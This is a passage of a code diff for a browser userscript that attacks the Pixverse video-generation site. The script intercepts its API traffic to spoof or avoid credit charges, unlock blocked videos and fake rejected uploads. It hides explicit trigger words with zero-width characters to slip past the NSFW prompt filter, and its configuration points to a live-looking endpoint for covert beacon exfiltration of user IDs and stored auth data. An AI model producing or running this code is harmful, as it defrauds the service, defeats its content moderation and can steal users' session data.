@@ -1,15 +1,16 @@
 // ==UserScript==
-// @name        4ndr0tools-Pixverse++
+// @name        4ndr0tools-PixverseChimera
 // @namespace   https://github.com/4ndr0666/userscripts
 // @author      4ndr0666
-// @version     2.3.2 
-// @description Red-team lab toolset blue team engagements focusing on exploits: credits patch, video/status unlock, robust download, prompt NSFW bypass, API override, anti-blockers. Includes self-healing hooks and covert data exfiltration.
+// @version     3.0.1
+// @description The ultimate Pixverse red-team toolkit: dynamically configurable control panel, multi-vector credit bypass (deduction prevention & response/DOM spoofing), video/status unlock, forced quality, advanced NSFW prompt obfuscation, robust native download, API override (logging & faking), anti-blockers, self-healing hooks, and covert C2 data exfiltration.
 // @downloadURL https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++.user.js
 // @updateURL   https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++.user.js
 // @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
 // @match       https://app.pixverse.ai/*
 // @run-at      document-start
-// @grant       none
+// @grant       GM_setValue
+// @grant       GM_getValue
 // @license     MIT
 // ==/UserScript==
 
@@ -22,40 +23,73 @@
   }
   window._pixverseToolkitInitialized = true;
 
-  //────── CONSTANTS & CONFIG ──────//
+  //────── CORE CONFIGURATION & STATE ──────//
 
-  // Set DEBUG_MODE to true during development/testing for console logs and toast notifications.
-  // Set to false for stealthy red team deployment.
-  const DEBUG_MODE = false; // <<< IMPORTANT FOR TESTING/DEBUGGING: Set to 'true' >>>
-
-  const DEBUG_PREFIX = '[Pixverse++]'; // Used only if DEBUG_MODE is true
-  const MAX_ATTEMPTS = 30; // Max attempts for DOM element observation in setupWatermarkButton
+  const DEBUG_PREFIX = '[ChimeraKit]';
+  const DATA_LOG_PREFIX = '[ChimeraKit DATA]'; // For structured data logs in debug UI
+  const MAX_ATTEMPTS = 30; // Max attempts for DOM element observation
   let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
-  let isInitialized  = false; // Flag to ensure core overrides are run only once
-  let btnAttached    = false; // Flag to track if the custom download button handler has been attached
-
-  // --- C2 Configuration for Data Exfiltration ---
-  // IMPORTANT: Replace 'https://your-c2.com' with your actual controlled server domain for live use.
-  // Your server should be configured to receive GET requests at the /exfil path and log the parameters.
-  const C2_SERVER_DOMAIN = 'https://your-c2.com';
+  let isInitialized = false; // Flag to ensure core overrides are run only once
 
   // --- References to your custom overridden functions for self-healing ---
-  // These will store the function pointers to your overridden XMLHttpRequest.prototype.open
-  // and window.fetch so you can check if they've been replaced by other scripts.
   let myCustomXhrOpen = null;
   let myCustomFetch = null;
 
-  // List of words to obfuscate in prompts to bypass NSFW filters.
+  // --- Operational Configuration (Dynamically loaded from GM_setValue via Control Panel) ---
+  const config = {
+    // Default settings. These will be loaded from storage if available.
+    debugMode: false,          // Show console logs, debug UI, and toast notifications.
+    c2Enabled: false,          // Enable covert data exfiltration.
+    c2Server: "https://eovz1i2e285q5i.m.pipedream.net", // Canonical C2 endpoint
+    creditBypassType: 'none',  // 'none', 'prevent_deduct', 'spoof_response', 'dom_tamper'
+    creditSpoofValue: 999999,  // Value for response/DOM spoofing
+    forceQuality: 'none',      // 'none', '720p', '1080p'
+    nsfwObfuscation: 'zwsp',   // 'none', 'zwsp', 'bubble_zwsp'
+    autoExfilAuth: false,      // Auto-exfiltrate localStorage auth data on init
+    domTamperTarget: 'span.text-text-credit' // Specific CSS selector for DOM tampering
+  };
+
+  // List of words to obfuscate in prompts to bypass NSFW filters
   const TRIGGER_WORDS = [
-	  "anal","asshole","anus","areola","areolas","blowjob","boobs","bounce","bouncing","breast","breasts",
-	  "bukake","buttcheeks","butt","cheeks","climax","clit","cleavage","cock","corridas","crotch","cum","cums","culo","cunt",
-	  "deep","deepthroat","ddick","dick","esperma","fat ass","fellatio","fingering","fuck","fucking","fucked","horny","lick","masturbate",
-	  "masterbating","missionary","member","meco","moan","moaning","nipple","nsfw","oral","orgasm","penis","phallus","pleasure",
-	  "pussy","rump","semen","slut","slutty","splooge","squeezing","squeeze","suck","sucking","swallow","throat","throating",
-	  "tits","tit","titty","titfuck","titties","tittydrop","tittyfuck","titfuck","vagina","wiener","whore","creampie","cumshot","cunnilingus",
-	  "doggystyle","ejaculate","ejaculation","handjob","jerk off","labia","nude","orgy","porn","prolapse",
-	  "rectum","rimjob","sesual","stripper","submissive","teabag","threesome","vibrator","voyeur","whore"
+    "ass", "anal", "asshole", "anus", "areola", "areolas", "blowjob", "boobs", "bounce", "bouncing", "breast", "breasts",
+    "bukake", "buttcheeks", "butt", "cheeks", "climax", "clit", "cleavage", "cock", "corridas", "crotch", "cum", "cums", "culo", "cunt",
+    "deep", "deepthroat", "deepthroating", "deepthroated", "dick", "esperma", "fat ass", "fellatio", "fingering", "fuck", "fucking", "fucked", "horny", "lick", "masturbate",
+    "masterbating","missionary","member","meco","moan","moaning","nipple","nsfw","oral","orgasm","penis","phallus","pleasure",
+    "pussy","rump","semen","seductively","slut","slutty","splooge","squeezing","squeeze","suck","sucking","swallow","throat","throating",
+    "tits","tit","titty","titfuck","titties","tittydrop","tittyfuck","titfuck","vagina","wiener","whore","creampie","cumshot","cunnilingus",
+    "doggystyle","ejaculate","ejaculation","handjob","jerk off","labia","nude","orgy","porn","prolapse",
+    "rectum","rimjob","sesual","stripper","submissive","teabag","threesome","vibrator","voyeur","whore"
   ];
+
+  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
+  const NSFW_PROMPT_REGEX = new RegExp(`\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`, "gi");
+
+  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
+  const API_ENDPOINTS = {
+    credits: /\/user\/credits(?:\?|$)/,
+    videoList: /\/video\/list\/personal/,
+    batchUpload: /\/media\/batch_upload_media/,
+    singleUpload: /\/media\/upload/,
+    creativeVideo: /\/creative_platform\/video\/(?:i2v|create)/, // For quality mod
+    creativePrompt: /\/creative_platform\/video\//, // Broader match for prompt obfuscation
+    creativeExtend: /\/creative_platform\/video\/extend/ // For duration/credit deduction modification
+  };
+
+  // --- Debugging and Analysis Framework (In-Memory Buffers) ---
+  const _redTeamDebugLog = []; // In-memory buffer for raw console-like messages
+  const _redTeamGoods = [];   // In-memory buffer for structured test results/API snapshots
+
+  // Expose debug buffers and control functions globally if debug mode is active
+  Object.defineProperty(window, 'redTeamDebugLog', { get: () => _redTeamDebugLog });
+  Object.defineProperty(window, 'redTeamGoods', { get: () => _redTeamGoods });
+  window.redTeamClear = () => {
+    _redTeamDebugLog.length = 0;
+    _redTeamGoods.length = 0;
+    log('Debug logs and goods cleared.');
+    if (config.debugMode) updateDebugUI();
+  };
+
+  //────── CORE HELPERS ──────//
 
   /**
    * Helper function to escape special characters in a string for use in a RegExp constructor.
@@ -63,31 +97,13 @@
    * @returns {string} - The escaped string.
    */
   function escapeRegExp(str) {
-    // Correctly escapes all special regex characters. $& inserts the matched substring.
     return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
   }
-
-  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
-  // This is a significant performance improvement over creating a new regex for each word
-  // every time obfuscatePrompt is called.
-  const NSFW_PROMPT_REGEX = new RegExp(
-    `\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`, // Combines all words with OR (?:...) for non-capturing group
-    "gi" // Global and case-insensitive flags
-  );
-
-  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
-  const API_ENDPOINTS = {
-    credits:        /\/user\/credits(?:\?|$)/, // Matches /user/credits or /user/credits?param=value
-    videoList:      /\/video\/list\/personal/,
-    batchUpload:    /\/media\/batch_upload_media/,
-    singleUpload:   /\/media\/upload/,
-    creativePrompt: /\/creative_platform\/video\// // Endpoint for submitting video generation prompts
-  };
 
   /**
    * Checks if a given URL matches a predefined API endpoint using its regex.
    * @param {string} url - The URL to test.
-   * @param {string} key - The key of the API endpoint in API_ENDPOINTS (e.g., "credits", "videoList").
+   * @param {string} key - The key of the API endpoint in API_ENDPOINTS.
    * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
    */
   function matchesEndpoint(url, key) {
@@ -95,129 +111,340 @@
   }
 
   /**
-   * Logs messages to the console with a consistent prefix for easy filtering.
-   * Only logs if DEBUG_MODE is true.
+   * Logs messages to the console with a consistent prefix.
+   * Only logs if `config.debugMode` is true.
    * @param {...any} args - Arguments to log.
    */
   function log(...args) {
-    if (DEBUG_MODE) {
+    if (config.debugMode) {
       console.log(DEBUG_PREFIX, ...args);
     }
   }
 
   /**
    * Logs error messages to the console with a consistent prefix.
-   * Only logs if DEBUG_MODE is true.
-   * In a high-stealth scenario, even these might be removed or sent to a hidden location.
+   * Only logs if `config.debugMode` is true.
    * @param {...any} args - Arguments to log.
    */
   function error(...args) {
-    if (DEBUG_MODE) {
+    if (config.debugMode) {
       console.error(DEBUG_PREFIX, ...args);
     }
   }
 
   /**
-   * Exfiltrates data covertly using an image beacon.
-   * Only attempts if C2_SERVER_DOMAIN is configured.
-   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
-   * @param {string} dataPayload - The actual data to exfiltrate.
+   * Safely deep clones an object, falling back to JSON serialization if structuredClone fails or is unavailable.
+   * Catches potential errors like circular references during JSON serialization.
+   * @param {object} obj - The object to clone.
+   * @returns {object|null} - A deep clone of the object, or null if cloning fails.
    */
-  function exfiltrateData(dataType, dataPayload) {
-    // Prevent exfiltration if C2_SERVER_DOMAIN is not properly set (or is the placeholder).
-    if (!C2_SERVER_DOMAIN || C2_SERVER_DOMAIN === 'https://your-c2.com') {
-      error("C2_SERVER_DOMAIN not configured or set to placeholder. Data exfiltration skipped.");
-      return;
-    }
-    try {
-      const beacon = new Image();
-      // Construct the URL: your C2 server, a path to identify the data type, and the encoded payload.
-      // The timestamp helps prevent caching and adds a bit of uniqueness.
-      beacon.src = `${C2_SERVER_DOMAIN}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
-      // No need to append to DOM, just setting src triggers the request.
-      log(`Data exfiltration initiated for type: ${dataType}`);
-    } catch (e) {
-      error(`Failed to exfiltrate data of type ${dataType}:`, e);
+  function safeDeepClone(obj) {
+      if (typeof obj !== 'object' || obj === null) {
+          return obj;
+      }
+      try {
+          if (typeof structuredClone === 'function') {
+              return structuredClone(obj);
+          }
+      } catch (e) {
+          error("structuredClone failed, falling back to JSON serialization. Error:", e);
+      }
+      try {
+          return JSON.parse(JSON.stringify(obj));
+      } catch (e) {
+          error("Failed to deep clone object via JSON serialization (possible circular reference or non-serializable data). Error:", e);
+          return null;
+      }
+  }
+
+  /**
+   * Logs specific messages to the in-memory debug buffer and console.
+   * Only logs if `config.debugMode` is true.
+   * @param {string} message - The main log message.
+   * @param {object} [data] - Optional structured data to log. This will also be pushed to _redTeamGoods if provided.
+   */
+  function writeToLogFile(message, data = null) {
+    if (config.debugMode) {
+      const timestamp = new Date().toISOString();
+      _redTeamDebugLog.push(`${timestamp} ${message}`);
+      console.log(`${DATA_LOG_PREFIX} ${message}`, data || '');
+      if (data) {
+        const clonedData = safeDeepClone(data);
+        if (clonedData !== null) {
+          _redTeamGoods.push({ timestamp, message, data: clonedData, type: 'custom_log' });
+        } else {
+          error("Failed to log structured data due to cloning issue:", data);
+        }
+      }
+      if (config.debugMode) updateDebugUI();
     }
   }
 
   /**
-   * Parses a request body (either FormData or a JSON string) into a JavaScript object.
-   * @param {FormData|string} body - The request body.
+   * Logs API request/response data to the in-memory structured data buffer and console.
+   * @param {string} url - The URL of the API endpoint.
+   * @param {object} data - The request body or response data.
+   * @param {'request_original' | 'request_modified' | 'response_original' | `response_status_${number}` | 'response_modified'} type - Type of data.
+   */
+  function logApiResponse(url, data, type) {
+    if (config.debugMode) {
+      const timestamp = new Date().toISOString();
+      const clonedData = safeDeepClone(data);
+      if (clonedData !== null) {
+        const entry = { timestamp, url, type, data: clonedData };
+        _redTeamGoods.push(entry);
+        writeToLogFile(`API ${type.toUpperCase()} for ${url}`, entry);
+      } else {
+         error(`Failed to log API ${type} for ${url} due to cloning issue. Original data:`, data);
+      }
+    }
+  }
+
+  /**
+   * Dumps current localStorage, sessionStorage, and document.cookie to the debug log.
+   * Only active if `config.debugMode` is true.
+   * @param {string} context - A label for when the state was dumped.
+   */
+  function dumpBrowserState(context = "UNKNOWN") {
+    if (!config.debugMode) return;
+
+    const state = {
+      localStorage: {},
+      sessionStorage: {},
+      cookies: document.cookie
+    };
+
+    try {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        state.localStorage[key] = localStorage.getItem(key);
+      }
+    } catch (e) {
+      state.localStorage.error = `Access denied: ${e.message}`;
+      error("Error accessing localStorage:", e);
+    }
+
+    try {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        state.sessionStorage[key] = sessionStorage.getItem(key);
+      }
+    } catch (e) {
+      state.sessionStorage.error = `Access denied: ${e.message}`;
+      error("Error accessing sessionStorage:", e);
+    }
+    const timestamp = new Date().toISOString();
+    const clonedState = safeDeepClone(state);
+    if (clonedState !== null) {
+      const entry = { timestamp, type: 'browser_state', context, data: clonedState };
+      _redTeamGoods.push(entry);
+      writeToLogFile(`Browser State Snapshot (${context})`, entry);
+    } else {
+      error("Failed to log browser state due to cloning issue. Original state:", state);
+    }
+  }
+
+  /**
+   * Analyzes collected `_redTeamGoods` (structured logs) to suggest potential credit-related keys.
+   * This function is exposed globally as `window.analyzeCredits()` in DEBUG_MODE.
+   */
+  window.analyzeCredits = function() {
+    if (!config.debugMode) {
+      console.warn("Credit analysis is only available in Debug Mode.");
+      return;
+    }
+    writeToLogFile("Initiating credit-related data analysis...");
+    const creditKeywords = ["credit", "credits", "balance", "bal", "amount", "coin", "coins", "token", "tokens",
+                            "limit", "allowance", "premium", "cost", "price", "fee", "tier", "usage", "subscription",
+                            "currency", "points", "xp", "gems", "duration"];
+    const potentialKeys = new Set();
+    const analysisResults = [];
+
+    _redTeamGoods.forEach(entry => {
+      if (entry.type.startsWith('response') || entry.type.startsWith('request') || entry.type === 'custom_log') {
+        const url = entry.url || (entry.data ? entry.data.url : 'N/A');
+        const data = entry.data;
+
+        const search = (obj, path = '') => {
+          if (typeof obj !== 'object' || obj === null) return;
+          Object.entries(obj).forEach(([key, value]) => {
+            const currentPath = path ? `${path}.${key}` : key;
+            if (creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
+              potentialKeys.add(`API Key: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
+              analysisResults.push({ type: 'API Key Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
+            }
+            if (typeof value === 'string' && creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
+              potentialKeys.add(`API Value: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
+              analysisResults.push({ type: 'API Value Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
+            }
+            else if (typeof value === 'number' && Number.isInteger(value) && value >= 0 && creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
+               potentialKeys.add(`API Numeric Value: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
+               analysisResults.push({ type: 'API Numeric Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
+            }
+            if (typeof value === 'object' && value !== null) {
+              search(value, currentPath);
+            }
+          });
+        };
+        search(data);
+      } else if (entry.type === 'browser_state') {
+        const context = entry.context;
+        const stateData = entry.data;
+
+        const searchState = (obj, storageType, path = '') => {
+          if (typeof obj !== 'object' || obj === null) return;
+          Object.entries(obj).forEach(([key, value]) => {
+            const currentPath = path ? `${path}.${key}` : key;
+            if (creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
+              potentialKeys.add(`${storageType} Key: ${currentPath} (Context: ${context})`);
+              analysisResults.push({ type: `${storageType} Key Match`, key: currentPath, value, context, entryTimestamp: entry.timestamp });
+            }
+            if (typeof value === 'string') {
+                if (creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
+                    potentialKeys.add(`${storageType} Value: ${currentPath} (Context: ${context})`);
+                    analysisResults.push({ type: `${storageType} Value Match`, key: currentPath, value, context, entryTimestamp: entry.timestamp });
+                }
+                try { // Try to parse string values as JSON for deeper analysis
+                    const parsed = JSON.parse(value);
+                    if (typeof parsed === 'object' && parsed !== null) searchState(parsed, storageType, currentPath);
+                } catch (e) { /* Not JSON, ignore */ }
+            }
+            if (typeof value === 'object' && value !== null) {
+              searchState(value, storageType, currentPath);
+            }
+          });
+        };
+        searchState(stateData.localStorage, 'localStorage');
+        searchState(stateData.sessionStorage, 'sessionStorage');
+        stateData.cookies.split(';').forEach(cookie => {
+          const [name, value] = cookie.split('=').map(s => s.trim());
+          if (creditKeywords.some(kw => name.toLowerCase().includes(kw))) {
+            potentialKeys.add(`Cookie Key: ${name} (Context: ${context})`);
+            analysisResults.push({ type: 'Cookie Key Match', key: name, value, context, entryTimestamp: entry.timestamp });
+          }
+          if (creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
+            potentialKeys.add(`Cookie Value: ${name} (Context: ${context})`);
+            analysisResults.push({ type: 'Cookie Value Match', key: name, value, context, entryTimestamp: entry.timestamp });
+          }
+        });
+      }
+    });
+
+    if (potentialKeys.size > 0) {
+      writeToLogFile("Found potential credit-related keys/patterns:", {
+        summary: Array.from(potentialKeys),
+        details: analysisResults
+      });
+      console.log(`${DATA_LOG_PREFIX} --- Potential Credit Keys/Patterns ---`);
+      potentialKeys.forEach(key => console.log(`${DATA_LOG_PREFIX} - ${key}`));
+      console.log(`${DATA_LOG_PREFIX} See window.redTeamGoods for detailed analysis results.`);
+    } else {
+      writeToLogFile("No obvious credit-related keys/patterns found in collected data.");
+      console.log(`${DATA_LOG_PREFIX} No obvious credit-related keys/patterns found.`);
+    }
+  };
+
+  /**
+   * Parses a request body (either FormData, JSON string, or URLSearchParams) into a JavaScript object.
+   * Handles complex body types gracefully.
+   * @param {FormData|string|URLSearchParams|Blob|ArrayBuffer} body - The request body.
    * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
    */
   function parseBody(body) {
     if (body instanceof FormData) {
       try {
-        return Object.fromEntries(body);
-      } catch (e) {
-        error("Failed to parse FormData:", e);
-        return null;
-      }
+        const obj = {};
+        for (const [key, value] of body.entries()) {
+            obj[key] = (value instanceof File) ? { fileName: value.name, fileSize: value.size, fileType: value.type } : value;
+        }
+        return obj;
+      } catch (e) { error("Failed to parse FormData:", e); return null; }
     }
     if (typeof body === "string") {
-      try {
-        return JSON.parse(body);
-      } catch (e) {
-        error("Failed to parse JSON string:", e);
-        return null;
-      }
+      try { return JSON.parse(body); } catch (e) { error("Failed to parse JSON string. Body content:", body, "Error:", e); return null; }
     }
-    return null; // Return null for unsupported body types
+    if (body instanceof URLSearchParams) { return Object.fromEntries(body.entries()); }
+    if (body && typeof body.toString === 'function' && !(body instanceof Object && body.constructor === Object)) {
+        log("Unsupported complex body type, converting to string representation:", body);
+        return { rawBodyType: body.constructor.name, rawBodyString: body.toString() };
+    }
+    return null;
   }
 
   /**
-   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
-   * This technique can bypass simple string-matching NSFW filters by breaking up the words
-   * without changing their visual appearance.
+   * Obfuscates trigger words in a prompt based on config.nsfwObfuscation.
    * @param {string} prompt - The original prompt string.
    * @returns {string} - The obfuscated prompt string.
    */
   function obfuscatePrompt(prompt) {
-    // Use the pre-compiled regex for efficient replacement.
-    return prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
+    if (config.nsfwObfuscation === 'none') return prompt;
+
+    let modifiedPrompt = prompt;
+    if (config.nsfwObfuscation === 'zwsp') {
+        modifiedPrompt = prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
+    } else if (config.nsfwObfuscation === 'bubble_zwsp') {
+        const toBubble = (char) => {
+            const code = char.toLowerCase().charCodeAt(0);
+            return (code >= 97 && code <= 122) ? String.fromCodePoint(0x24B6 + (code - 97)) : char;
+        };
+        modifiedPrompt = prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').map(toBubble).join('\u200B'));
+    }
+    return modifiedPrompt;
   }
 
   /**
    * Extracts a media path from an API request body, specifically for upload endpoints.
-   * This path is then used to fake successful uploads if the actual upload fails.
    * @param {object} data - The request data object.
    * @param {string} url - The URL of the request, used to determine the endpoint type.
    * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
    */
   function extractMediaPath(data, url) {
-    if (!data || typeof data !== "object") {
-      return null;
-    }
-    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) {
-      return data.images[0]?.path || null;
-    }
+    if (!data || typeof data !== "object") return null;
+    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) { return data.images[0]?.path || null; }
     if (matchesEndpoint(url, "singleUpload")) {
       if (typeof data.path === "string") return data.path;
       if (typeof data.media_path === "string") return data.media_path;
-      // Fallback: look for any string property that looks like an MP4 path
-      for (const k in data) {
-        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) {
-          return data[k];
-        }
+      for (const k in data) { // Fallback
+        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) return data[k];
       }
     }
     return null;
   }
 
   /**
-   * Modifies the user credits response to always show 100 credits.
-   * @param {object} data - The original response data.
-   * @returns {object|null} - The modified data, or null if the structure doesn't match.
+   * Exfiltrates data covertly using an image beacon.
+   * Only attempts if `config.c2Enabled` is true and `config.c2Server` is configured (not placeholder).
+   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
+   * @param {string} dataPayload - The actual data to exfiltrate.
    */
-  function tryModifyCredits(data) {
-    if (data?.Resp?.credits !== undefined) {
-      const clone = structuredClone(data); // Create a deep clone to avoid side effects on original response
-      clone.Resp.credits = 100;
-      log('Credits restored to 100');
-      // Example: Exfiltrate a user ID if it's available in the credits response
-      if (data.Resp.user_id) { // Assuming 'user_id' might be a key in the Resp object
-          exfiltrateData("user_id_from_credits", data.Resp.user_id.toString());
+  function exfiltrateData(dataType, dataPayload) {
+    if (!config.c2Enabled || !config.c2Server || config.c2Server.includes('your-c2.com') || config.c2Server.includes('c2.example.com')) {
+      log("C2 exfiltration is disabled or server is not configured/placeholder. Skipping.");
+      return;
+    }
+    try {
+      const beacon = new Image();
+      beacon.src = `${config.c2Server}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
+      log(`Data exfiltration initiated for type: ${dataType}`);
+    } catch (e) {
+      error(`Failed to exfiltrate data of type ${dataType}:`, e);
+    }
+  }
+
+  //────── API MODIFICATION LOGIC ──────//
+
+  /**
+   * Modifies the user credits response to spoof a high credit value.
+   * @param {object} data - The original response data.
+   * @returns {object|null} - The modified data, or null if no spoofing is applied.
+   */
+  function spoofCreditsResponse(data) {
+    if (config.creditBypassType === 'spoof_response' && data?.Resp?.credits !== undefined) {
+      const clone = structuredClone(data);
+      clone.Resp.credits = config.creditSpoofValue;
+      log(`Credits response spoofed to ${config.creditSpoofValue}`);
+      if (config.c2Enabled && data.Resp.user_id) {
+          exfiltrateData("user_id_from_credits_spoof", data.Resp.user_id.toString());
       }
       return clone;
     }
@@ -225,54 +452,27 @@
   }
 
   /**
-   * Modifies the video list response to unlock video status (e.g., from blocked to ready)
-   * and bypass NSFW placeholder images by pointing directly to the video path.
+   * Modifies the video list response to unlock video status and bypass NSFW placeholders.
    * @param {object} data - The original response data.
-   * @returns {object} - The modified data. Returns original data if structure is unexpected.
+   * @returns {object} - The modified data (or original if no changes).
    */
   function modifyVideoList(data) {
-    if (!data?.Resp?.data) {
-      return data; // Return original data if the expected structure is missing
-    }
-    // List of strings commonly found in NSFW placeholder URLs.
-    const NSFW_PLACEHOLDERS = [
-      "/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"
-    ];
+    if (!data?.Resp?.data) return data;
 
-    /**
-     * Helper to check if a URL contains any known NSFW placeholder strings.
-     * @param {string} url - The URL to check.
-     * @returns {boolean} - True if the URL is likely an NSFW placeholder, false otherwise.
-     */
-    function isNSFW(url) {
-      if (!url) return false;
-      return NSFW_PLACEHOLDERS.some(p => url.includes(p));
-    }
-
-    const clone = structuredClone(data); // Create a deep clone to safely modify the data
+    const NSFW_PLACEHOLDERS = ["/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"];
+    const isNSFW = (url) => url && NSFW_PLACEHOLDERS.some(p => url.includes(p));
+    const clone = structuredClone(data); // Deep clone for safety
     clone.Resp.data = clone.Resp.data.map(item => {
-      // Change video_status 7 (often indicates blocked/pending) to 1 (ready/available)
-      if (item.video_status === 7) {
-        item.video_status = 1;
-      }
+      if (item.video_status === 7) item.video_status = 1;
 
-      let preview =
-        (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) ||
-        item.customer_paths?.customer_img_url ||
-        '';
-
-      // If the current preview URL is not an NSFW placeholder and is valid, use it.
-      // Otherwise, try to construct a direct URL to the video itself for the preview.
+      let preview = (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) || item.customer_paths?.customer_img_url || '';
       if (!isNSFW(preview) && preview) {
         item.first_frame = preview;
       } else if (item.video_path) {
-        // Append #t=0.2 to load the video at 0.2 seconds, often used for a quick preview frame.
         item.first_frame = `https://media.pixverse.ai/${item.video_path}#t=0.2`;
       } else {
-        // Fallback to the original preview if no video_path is available.
         item.first_frame = preview;
       }
-      // Ensure the main video URL points directly to the media server if video_path exists.
       item.url = item.video_path ? `https://media.pixverse.ai/${item.video_path}` : '';
       return item;
     });
@@ -281,7 +481,6 @@
 
   /**
    * Central function to apply appropriate response modifications based on the request URL.
-   * This is where the core API bypass logic resides for various endpoints.
    * @param {object} data - The original response data.
    * @param {string} url - The URL of the request.
    * @returns {object|null} - The modified data, or null if no modification was applied.
@@ -289,56 +488,31 @@
   function modifyResponse(data, url) {
     if (!data || typeof data !== "object") return null;
 
-    // Credit modification (always attempt if endpoint matches)
+    let modified = null;
+
     if (matchesEndpoint(url, "credits")) {
-      const modified = tryModifyCredits(data);
+      modified = spoofCreditsResponse(data);
       if (modified) return modified;
     }
 
-    // Video list modification (always attempt if endpoint matches)
     if (matchesEndpoint(url, "videoList")) {
+      modified = modifyVideoList(data);
       // modifyVideoList always returns data or a clone, so it's always a "modification" for this branch.
-      return modifyVideoList(data);
+      if (modified) return modified;
     }
 
     // Upload modification: apply a generic success fake if any error occurs AND we have a saved path.
-    // This is crucial for bypassing NSFW upload rejections.
-    if (matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) {
-      // Only proceed if the server returned an error (ErrCode is not 0) and we have a media path
-      // captured from the request (meaning a file was actually attempted to be uploaded).
-      if (data?.ErrCode !== 0 && savedMediaPath) {
-        log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
-        // Construct the faked success response based on the endpoint type.
-        if (matchesEndpoint(url, "batchUpload")) {
-          const id = Date.now(); // Generate a unique ID for the faked upload
-          const name = savedMediaPath.split('/').pop() || 'uploaded_media'; // Extract filename from path
-          return {
-            ErrCode: 0, // Indicate success
-            ErrMsg: "success",
-            Resp: {
-              result: [{
-                id, category: 0, err_msg: "",
-                name, path: savedMediaPath, size: 0, // Size can be 0 as it's a faked response
-                url: `https://media.pixverse.ai/${savedMediaPath}`
-              }]
-            }
-          };
-        } else { // singleUpload
-          return {
-            ErrCode: 0, ErrMsg: "success", Resp: {
-              path: savedMediaPath,
-              url: `https://media.pixverse.ai/${savedMediaPath}`,
-              name: savedMediaPath.split('/').pop() || 'uploaded_media',
-              type: 1
-            }
-          };
-        }
-      } else if (DEBUG_MODE && data?.ErrCode !== undefined && data.ErrCode !== 0) {
-        // Log if an error occurred for an upload, but we couldn't fake it (e.g., no savedMediaPath),
-        // which helps in debugging new error types or missing paths. Only log in debug mode.
-        log(`Upload error for ${url}, but faking not applied. ErrCode: ${data.ErrCode}, savedMediaPath: ${savedMediaPath}`);
+    if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && data?.ErrCode !== 0 && savedMediaPath) {
+      log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
+      const name = savedMediaPath.split('/').pop() || 'uploaded_media';
+      if (matchesEndpoint(url, "batchUpload")) {
+        modified = { ErrCode: 0, ErrMsg: "success", Resp: { result: [{ id: Date.now(), category: 0, err_msg: "", name, path: savedMediaPath, size: 0, url: `https://media.pixverse.ai/${savedMediaPath}` }] } };
+      } else { // singleUpload
+        modified = { ErrCode: 0, ErrMsg: "success", Resp: { path: savedMediaPath, url: `https://media.pixverse.ai/${savedMediaPath}`, name, type: 1 } };
       }
+      return modified;
     }
+
     return null; // No applicable modification found.
   }
 
@@ -346,47 +520,78 @@
 
   /**
    * Sanitizes a string for use as a filename.
-   * Removes invalid filename characters, leading/trailing dots/spaces, and truncates.
    * @param {string} str - The input string.
    * @returns {string} - The sanitized filename string.
    */
   function sanitize(str) {
-    // Remove invalid filename characters: \ / : * ? " < > |
-    // Also remove control characters (\u0000-\u001F)
-    // Replace leading/trailing dots or spaces, and truncate.
     return String(str)
-      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_") // Replace invalid characters with underscore
-      .replace(/^\.+/, '') // Remove leading dots
-      .replace(/\.+$/, '') // Remove trailing dots
-      .replace(/^\s+|\s+$/g, '') // Trim leading/trailing whitespace
-      .slice(0, 120); // Safety truncation to prevent excessively long filenames
